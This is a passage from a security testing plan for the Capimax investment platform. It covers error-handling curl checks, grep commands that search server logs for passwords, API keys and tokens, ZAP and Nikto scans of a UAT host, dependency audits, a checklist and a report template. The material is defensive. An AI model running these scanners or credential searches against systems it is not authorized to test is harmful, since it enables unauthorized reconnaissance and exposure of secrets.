  -H "Authorization: Bearer $TOKEN" \
  -H "Content-Type: application/json" \
  -d '{"invalid": "data"}'

# Test authentication errors
curl -X POST "$TEST_API_URL/auth/login/" \
  -H "Content-Type: application/json" \
  -d '{"email":"nonexistent@test.com","password":"anything"}'
```

**Pass Criteria:**
- ✅ No stack traces in production responses
- ✅ No database query errors exposed
- ✅ No file paths or internal structure revealed
- ✅ Generic error messages for auth failures
- ✅ Error details logged server-side, not sent to client

---

### Test Case DATA-002: Logging Security

**Objective:** Verify logs don't contain sensitive data

**Test Commands:**
```bash
# Check application logs
sudo grep -r "password\|secret\|api_key\|private_key" /var/log/capimax/ | grep -v "REDACTED"

# Check Django logs
sudo tail -100 /var/log/capimax/django.log | grep -E "password|secret|api_key"

# Check Nginx access logs for tokens in URLs
sudo tail -100 /var/log/nginx/capimax_access.log | grep -E "token=|password="
```

**Pass Criteria:**
- ✅ No passwords in logs
- ✅ No API keys or secrets in logs
- ✅ Authentication tokens redacted in logs
- ✅ PII (emails, addresses) redacted or hashed in logs
- ✅ Credit card numbers never logged

---

## Automated Security Scanning

### Scan 1: OWASP ZAP Automated Scan

**Setup:**
```bash
# Install OWASP ZAP
# Download from https://www.zaproxy.org/download/

# Run automated scan
zap-cli quick-scan -s all -r report.html https://uat.capimaxinvestment.com

# Or use Docker
docker run -t owasp/zap2docker-stable zap-baseline.py \
  -t https://uat.capimaxinvestment.com \
  -r zap_report.html
```

**Pass Criteria:**
- ✅ No high-risk vulnerabilities
- ✅ Medium-risk vulnerabilities have mitigation plans
- ✅ SQL injection tests pass
- ✅ XSS tests pass
- ✅ CSRF tests pass

---

### Scan 2: Nikto Web Server Scan

**Test Command:**
```bash
# Scan web server
nikto -h https://uat.capimaxinvestment.com -o nikto_report.html -Format html

# Scan API
nikto -h https://uat.capimaxinvestment.com/api/v1/ -o nikto_api_report.html -Format html
```

**Pass Criteria:**
- ✅ No critical vulnerabilities found
- ✅ Server version information hidden
- ✅ Directory listing disabled
- ✅ Default files removed
- ✅ Unnecessary HTTP methods disabled

---

### Scan 3: Dependency Vulnerability Scan

**Test Commands:**
```bash
# Backend dependencies
cd capimax_backend
safety check --json > safety_report.json
bandit -r . -f json -o bandit_report.json

# Frontend dependencies
cd capimax-preview
npm audit --json > npm_audit.json
npm audit fix  # Fix automatically if safe

# Check for outdated packages
pip list --outdated
npm outdated
```

**Pass Criteria:**
- ✅ No known high/critical vulnerabilities
- ✅ All dependencies up to date
- ✅ Regular dependency update schedule established
- ✅ Security advisories monitored

---

## Security Testing Checklist

### Pre-Production Security Validation

- [ ] All authentication tests passed
- [ ] SQL injection tests passed
- [ ] XSS tests passed
- [ ] CSRF protection verified
- [ ] IDOR vulnerabilities fixed
- [ ] Rate limiting working
- [ ] File upload security verified
- [ ] All security headers present
- [ ] SSL/TLS A+ rating achieved
- [ ] Payment security validated
- [ ] Blockchain security verified
- [ ] WebSocket security tested
- [ ] No sensitive data in logs
- [ ] No sensitive data in errors
- [ ] OWASP ZAP scan passed
- [ ] Nikto scan passed
- [ ] Dependency vulnerabilities resolved
- [ ] Security documentation updated
- [ ] Incident response plan documented
- [ ] Security team trained

---

## Recommended Testing Schedule

### Before Launch:
- Full manual security testing (all test cases)
- Automated scanner suite (ZAP + Nikto + SQLMap)
- Dependency vulnerability scan
- SSL/TLS configuration test
- Penetration testing (by security professional)

### Weekly:
- Dependency vulnerability scan (safety, npm audit)
- Automated security regression tests

### Monthly:
- Full automated scan (ZAP)
- Security header verification
- SSL certificate expiry check

### Quarterly:
- Full penetration test
- Security audit
- Dependency updates

---

## Security Testing Report Template

```markdown
# Security Testing Report - Capimax Platform

**Test Date:** YYYY-MM-DD
**Tester:** [Name]
**Environment:** UAT/Production
**Version:** [Version Number]

## Executive Summary
[Brief overview of security posture]

## Tests Executed
- [ ] Authentication & Authorization (X tests)
- [ ] SQL Injection (X tests)
- [ ] XSS (X tests)
- [ ] CSRF (X tests)
- [ ] API Security (X tests)
- [ ] Rate Limiting (X tests)
- [ ] File Upload (X tests)
- [ ] Security Headers (X tests)
- [ ] SSL/TLS (X tests)
- [ ] Payment Security (X tests)
- [ ] Blockchain Security (X tests)
- [ ] WebSocket Security (X tests)
- [ ] Data Exposure (X tests)
- [ ] Automated Scans (X tests)

## Vulnerabilities Found

### Critical
[None / List]

### High
[None / List]

### Medium
[None / List]

### Low
[None / List]

## Recommendations
1. [Recommendation 1]
2. [Recommendation 2]

## Sign-off
Security tested and approved for [UAT/Production]

Tester: _________________ Date: _________
```

---

## Additional Resources

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [Django Security Guide](https://docs.djangoproject.com/en/4.2/topics/security/)
- [REST API Security Best Practices](https://restfulapi.net/security-essentials/)
- [PCI DSS Compliance](https://www.pcisecuritystandards.org/) (if handling card data)
- [GDPR Compliance](https://gdpr.eu/) (if serving EU users)

---

**Document Version:** 1.0
**Last Review:** January 2025
**Next Review:** March 2025
